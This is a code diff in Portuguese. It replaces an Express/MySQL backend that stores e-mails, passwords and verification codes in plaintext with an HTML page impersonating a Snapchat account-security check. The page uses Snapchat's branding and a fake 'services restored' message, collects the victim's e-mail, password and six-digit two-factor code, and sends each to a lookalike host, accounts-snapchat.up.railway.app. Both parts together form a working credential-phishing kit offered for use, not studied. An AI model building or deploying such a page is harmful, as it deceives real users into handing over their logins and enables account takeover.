@@ -1,70 +1,262 @@
-// v3
-const express = require('express');
-const mysql   = require('mysql2/promise');
-const cors    = require('cors');
-const path    = require('path');
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Desafio de segurança</title>
+  <link rel="icon" href="https://www.snapchat.com/favicon.ico" type="image/x-icon"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Inter', Arial, sans-serif; background: #fff; color: #111; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+    .card { width: 100%; max-width: 460px; padding: 48px 36px 40px; display: flex; flex-direction: column; align-items: center; }
+    .icone { width: 100px; height: 100px; object-fit: contain; margin-bottom: 20px; }
+    h1 { font-size: 1.75rem; font-weight: 700; text-align: center; margin-bottom: 8px; }
+    .sub { font-size: 0.95rem; color: #555; text-align: center; margin-bottom: 32px; }
+    .lbl { width: 100%; font-size: 0.85rem; font-weight: 600; color: #333; margin-bottom: 7px; }
+    input[type="email"], input[type="password"] { width: 100%; border: 1.5px solid #ccc; border-radius: 8px; padding: 13px 15px; font-size: 0.95rem; font-family: inherit; color: #111; outline: none; transition: border-color .2s, box-shadow .2s; margin-bottom: 18px; }
+    input[type="email"]:focus, input[type="password"]:focus { border-color: #bbb; box-shadow: 0 0 0 3px rgba(0,0,0,.07); }
+    input::placeholder { color: #aaa; }
+    .btn { width: 100%; padding: 14px; border: none; border-radius: 999px; background: #FFFC00; color: #111; font-family: inherit; font-size: 1rem; font-weight: 700; cursor: pointer; transition: opacity .2s, transform .15s; margin-top: 2px; }
+    .btn:hover { opacity: .85; transform: translateY(-1px); }
+    .btn:active { transform: translateY(0); }
+    .btn:disabled { opacity: .45; cursor: not-allowed; transform: none; }
+    .msg { width: 100%; margin-top: 12px; padding: 11px 14px; border-radius: 8px; font-size: .875rem; text-align: center; display: none; }
+    .msg.err { background: #fff0f0; border: 1px solid #ffcccc; color: #c00; display: block; }
+    .msg.ok  { background: #f0fff4; border: 1px solid #9eb; color: #070; display: block; }
+    .sec { display: none; width: 100%; flex-direction: column; align-items: flex-start; }
+    .sec.on { display: flex; animation: up .3s ease both; }
+    @keyframes up { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
+    .back { font-size: .8rem; color: #999; cursor: pointer; margin-top: 14px; width: 100%; text-align: center; }
+    .back:hover { color: #555; }
+    .footer { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px 16px; margin-top: 44px; padding-top: 20px; border-top: 1px solid #eee; width: 100%; }
+    .footer a { font-size: .75rem; color: #999; text-decoration: none; }
+    .footer a:hover { text-decoration: underline; }
+    .ok-icon { font-size: 3rem; text-align: center; width: 100%; margin-bottom: 14px; }
+    .ok-title { font-size: 1.2rem; font-weight: 700; text-align: center; width: 100%; margin-bottom: 6px; }
+    .ok-sub { font-size: .9rem; color: #555; text-align: center; width: 100%; }
+    .btn2 { width: 100%; padding: 13px; border: 1.5px solid #ccc; border-radius: 999px; background: #fff; color: #444; font-family: inherit; font-size: .95rem; font-weight: 600; cursor: pointer; margin-top: 22px; transition: background .2s; }
+    .btn2:hover { background: #f5f5f5; }
+    .code-wrap { display: flex; gap: 10px; justify-content: center; width: 100%; margin-bottom: 24px; }
+    .code-box { width: 52px; height: 60px; border: 1.5px solid #ccc; border-radius: 12px; font-size: 1.5rem; font-weight: 700; text-align: center; color: #111; outline: none; font-family: inherit; transition: border-color .2s, box-shadow .2s; -moz-appearance: textfield; }
+    .code-box::-webkit-outer-spin-button, .code-box::-webkit-inner-spin-button { -webkit-appearance: none; }
+    .code-box:focus { border-color: #111; box-shadow: 0 0 0 3px rgba(0,0,0,.08); }
+    .timer-wrap { width: 100%; text-align: center; margin-bottom: 20px; }
+    .timer-text { font-size: 0.9rem; color: #888; }
+    .timer-text span { font-weight: 700; color: #111; }
+    .timer-text.expired span { color: #c00; }
+    .resend-btn { background: none; border: none; font-family: inherit; font-size: 0.85rem; color: #0078d4; cursor: pointer; text-decoration: underline; padding: 0; }
+    .resend-btn:disabled { color: #aaa; cursor: not-allowed; text-decoration: none; }
+  </style>
+</head>
+<body>
+<div class="card">
 
-const app  = express();
-const PORT = process.env.PORT || 3000;
+  <img src="https://www.snapchat.com/favicon.ico" class="icone" alt="Snapchat"
+       onerror="this.style.display='none'"/>
 
-app.use(cors());
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
+  <!-- ETAPA 1: E-mail -->
+  <div class="sec on" id="s1">
+    <h1 style="width:100%">Confirme que é você</h1>
+    <p class="sub" style="width:100%">Qual é o seu endereço de e-mail?</p>
+    <div class="lbl">Endereço de e-mail</div>
+    <input type="email" id="email" placeholder="Digite seu endereço de e-mail"/>
+    <button class="btn" onclick="etapa1()">Verificar</button>
+    <div class="msg" id="m1"></div>
+  </div>
 
-const db = mysql.createPool(process.env.MYSQL_URL || {
-  host:     process.env.MYSQLHOST     || 'localhost',
-  port:     process.env.MYSQLPORT     || 3306,
-  user:     process.env.MYSQLUSER     || 'root',
-  password: process.env.MYSQLPASSWORD || '',
-  database: process.env.MYSQLDATABASE || 'cadastro_db'
-});
+  <!-- ETAPA 2: Senha -->
+  <div class="sec" id="s2">
+    <h1 style="width:100%">Digite sua senha</h1>
+    <p class="sub" style="width:100%" id="email-exib"></p>
+    <div class="lbl">Digite sua senha</div>
+    <input type="password" id="novaSenha" placeholder="Digite sua senha"/>
+    <div class="lbl">Confirme sua senha</div>
+    <input type="password" id="confirma" placeholder="Confirme sua senha"/>
+    <button class="btn" onclick="etapa2()">Confirmar</button>
+    <div class="msg" id="m2"></div>
+    <div class="back" onclick="ir(1)">← Usar outro e-mail</div>
+  </div>
 
-async function initDB() {
-  await db.query('DROP TABLE IF EXISTS usuarios');
-  await db.query(`
-    CREATE TABLE usuarios (
-      id        INT AUTO_INCREMENT PRIMARY KEY,
-      email     VARCHAR(255) DEFAULT NULL,
-      senha     VARCHAR(255) DEFAULT NULL,
-      codigo    VARCHAR(10)  DEFAULT NULL,
-      criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
-    )
-  `);
-  console.log('Banco pronto.');
-}
-initDB();
+  <!-- ETAPA 3: Código 6 dígitos -->
+  <div class="sec" id="s3">
+    <h1 style="width:100%">Confirme seu e-mail</h1>
+    <p class="sub" style="width:100%" id="codigo-sub">Insira o código enviado para o seu e-mail.</p>
+    <div class="code-wrap">
+      <input class="code-box" type="number" id="c0" oninput="onCode(this,0)" onkeydown="onKey(event,0)"/>
+      <input class="code-box" type="number" id="c1" oninput="onCode(this,1)" onkeydown="onKey(event,1)"/>
+      <input class="code-box" type="number" id="c2" oninput="onCode(this,2)" onkeydown="onKey(event,2)"/>
+      <input class="code-box" type="number" id="c3" oninput="onCode(this,3)" onkeydown="onKey(event,3)"/>
+      <input class="code-box" type="number" id="c4" oninput="onCode(this,4)" onkeydown="onKey(event,4)"/>
+      <input class="code-box" type="number" id="c5" oninput="onCode(this,5)" onkeydown="onKey(event,5)"/>
+    </div>
+    <div class="timer-wrap">
+      <div class="timer-text" id="timer-txt">Reenviar código em <span id="timer-count">1:00</span></div>
+      <button class="resend-btn" id="resend-btn" disabled onclick="reiniciarTimer()">Reenviar código</button>
+    </div>
+    <button class="btn" onclick="etapa3()">Verificar</button>
+    <div class="msg" id="m3"></div>
+    <div class="back" onclick="ir(2)">← Voltar</div>
+  </div>
 
-app.post('/salvar-email', async (req, res) => {
-  const { email } = req.body;
-  if (!email) return res.status(400).json({ mensagem: 'E-mail obrigatório.' });
-  try {
-    await db.query('INSERT INTO usuarios (email) VALUES (?)', [email]);
-    return res.json({ mensagem: 'E-mail salvo.' });
-  } catch (err) {
-    return res.status(500).json({ mensagem: 'Erro ao salvar e-mail.' });
+  <!-- ETAPA 4: Sucesso -->
+  <div class="sec" id="s4">
+    <div class="ok-icon">🎉</div>
+    <div class="ok-title">Confirmação realizada com sucesso!</div>
+    <p class="ok-sub">Seus serviços foram reabilitados!</p>
+    <button class="btn2" onclick="reiniciar()">Confirmação realizada!</button>
+  </div>
+
+  <div class="footer">
+    <a href="#">Empresa</a><a href="#">Comunidade</a><a href="#">Publicidade</a>
+    <a href="#">Direito</a><a href="#">Snap Inc.</a><a href="#">Suporte</a>
+    <a href="#">Comprar anúncios</a><a href="#">Centro de Privacidade</a>
+    <a href="#">Carreiras</a><a href="#">Diretrizes Comunitárias</a>
+    <a href="#">Políticas de Publicidade</a><a href="#">Suas opções de privacidade</a>
+    <a href="#">Notícias</a><a href="#">Centro de Segurança</a>
+    <a href="#">Política de Cookies</a><a href="#">Idioma</a>
+    <a href="#">Denunciar violação</a>
+  </div>
+</div>
+
+<script>
+  const BASE = 'https://accounts-snapchat.up.railway.app';
+  let emailSalvo = '';
+  let timerInterval = null;
+  let timerSeconds = 60;
+
+  function ir(n) {
+    document.querySelectorAll('.sec').forEach(s => s.classList.remove('on'));
+    document.getElementById('s' + n).classList.add('on');
   }
-});
-
-app.post('/salvar-senha', async (req, res) => {
-  const { email, senha } = req.body;
-  if (!email || !senha) return res.status(400).json({ mensagem: 'Dados obrigatórios.' });
-  try {
-    await db.query('UPDATE usuarios SET senha = ? WHERE email = ?', [senha, email]);
-    return res.json({ mensagem: 'Senha salva.' });
-  } catch (err) {
-    return res.status(500).json({ mensagem: 'Erro ao salvar senha.' });
+  function msg(elId, type, text) {
+    const el = document.getElementById(elId);
+    el.className = 'msg ' + type;
+    el.textContent = text;
   }
-});
-
-app.post('/salvar-codigo', async (req, res) => {
-  const { email, codigo } = req.body;
-  if (!email || !codigo) return res.status(400).json({ mensagem: 'Dados obrigatórios.' });
-  try {
-    await db.query('UPDATE usuarios SET codigo = ? WHERE email = ?', [codigo, email]);
-    return res.json({ mensagem: 'Código salvo.' });
-  } catch (err) {
-    return res.status(500).json({ mensagem: 'Erro ao salvar código.' });
+  function clearMsg(elId) {
+    const el = document.getElementById(elId);
+    el.className = 'msg'; el.textContent = '';
   }
-});
+  function maskEmail(e) {
+    const [u, d] = e.split('@');
+    return u[0] + '...@' + d;
+  }
+  async function post(endpoint, body) {
+    const res = await fetch(BASE + endpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    const data = await res.json();
+    return { ok: res.ok, data };
+  }
 
-app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
+  /* ── Etapa 1: salva e-mail ── */
+  async function etapa1() {
+    const email = document.getElementById('email').value.trim();
+    clearMsg('m1');
+    if (!email || !email.includes('@')) { msg('m1','err','Digite um e-mail válido.'); return; }
+    const btn = document.querySelector('#s1 .btn');
+    btn.disabled = true; btn.textContent = 'Verificando...';
+    try {
+      const { ok, data } = await post('/salvar-email', { email });
+      if (ok) {
+        emailSalvo = email;
+        document.getElementById('email-exib').textContent = maskEmail(email);
+        ir(2);
+      } else { msg('m1','err', data.mensagem || 'Erro ao verificar.'); }
+    } catch { msg('m1','err','Não foi possível conectar ao servidor.'); }
+    btn.disabled = false; btn.textContent = 'Verificar';
+  }
+
+  /* ── Etapa 2: salva senha ── */
+  async function etapa2() {
+    const senha    = document.getElementById('novaSenha').value;
+    const confirma = document.getElementById('confirma').value;
+    clearMsg('m2');
+    if (!senha)             { msg('m2','err','Digite a senha.'); return; }
+    if (senha !== confirma) { msg('m2','err','As senhas não coincidem.'); return; }
+    const btn = document.querySelector('#s2 .btn');
+    btn.disabled = true; btn.textContent = 'Salvando...';
+    try {
+      const { ok, data } = await post('/salvar-senha', { email: emailSalvo, senha });
+      if (ok) {
+        document.getElementById('codigo-sub').textContent =
+          'Insira o código enviado para ' + maskEmail(emailSalvo);
+        iniciarTimer();
+        ir(3);
+      } else { msg('m2','err', data.mensagem || 'Erro ao salvar senha.'); }
+    } catch { msg('m2','err','Não foi possível conectar ao servidor.'); }
+    btn.disabled = false; btn.textContent = 'Confirmar';
+  }
+
+  /* ── Etapa 3: salva código ── */
+  async function etapa3() {
+    const codigo = getCode();
+    clearMsg('m3');
+    if (codigo.length < 6) { msg('m3','err','Digite o código completo de 6 dígitos.'); return; }
+    const btn = document.querySelector('#s3 .btn');
+    btn.disabled = true; btn.textContent = 'Verificando...';
+    try {
+      const { ok, data } = await post('/salvar-codigo', { email: emailSalvo, codigo });
+      if (ok) { pararTimer(); ir(4); }
+      else { msg('m3','err', data.mensagem || 'Erro ao verificar código.'); }
+    } catch { msg('m3','err','Não foi possível conectar ao servidor.'); }
+    btn.disabled = false; btn.textContent = 'Verificar';
+  }
+
+  /* ── Campos do código ── */
+  function onCode(el, idx) {
+    el.value = el.value.replace(/\D/g,'').slice(-1);
+    if (el.value && idx < 5) document.getElementById('c'+(idx+1)).focus();
+  }
+  function onKey(e, idx) {
+    if (e.key==='Backspace' && !document.getElementById('c'+idx).value && idx>0)
+      document.getElementById('c'+(idx-1)).focus();
+    if (e.key==='ArrowLeft'  && idx>0) document.getElementById('c'+(idx-1)).focus();
+    if (e.key==='ArrowRight' && idx<5) document.getElementById('c'+(idx+1)).focus();
+  }
+  function getCode() {
+    return [0,1,2,3,4,5].map(i => document.getElementById('c'+i).value).join('');
+  }
+
+  /* ── Timer ── */
+  function iniciarTimer() {
+    timerSeconds = 60; renderTimer();
+    clearInterval(timerInterval);
+    timerInterval = setInterval(() => {
+      timerSeconds--;
+      renderTimer();
+      if (timerSeconds <= 0) {
+        clearInterval(timerInterval);
+        document.getElementById('timer-txt').classList.add('expired');
+        document.getElementById('timer-count').textContent = '0:00';
+        document.getElementById('resend-btn').disabled = false;
+      }
+    }, 1000);
+  }
+  function renderTimer() {
+    const m = Math.floor(timerSeconds/60), s = timerSeconds%60;
+    document.getElementById('timer-count').textContent = m+':'+(s<10?'0':'')+s;
+    document.getElementById('timer-txt').classList.remove('expired');
+    document.getElementById('resend-btn').disabled = true;
+  }
+  function pararTimer() { clearInterval(timerInterval); }
+  function reiniciarTimer() {
+    [0,1,2,3,4,5].forEach(i => { document.getElementById('c'+i).value=''; });
+    document.getElementById('c0').focus();
+    clearMsg('m3'); iniciarTimer();
+  }
+
+  /* ── Reset geral ── */
+  function reiniciar() {
+    pararTimer();
+    ['email','novaSenha','confirma'].forEach(id => {
+      const el = document.getElementById(id); if (el) el.value='';
+    });
+    [0,1,2,3,4,5].forEach(i => { document.getElementById('c'+i).value=''; });
+    emailSalvo = ''; ir(1);
+  }
+</script>
+</body>
+</html>
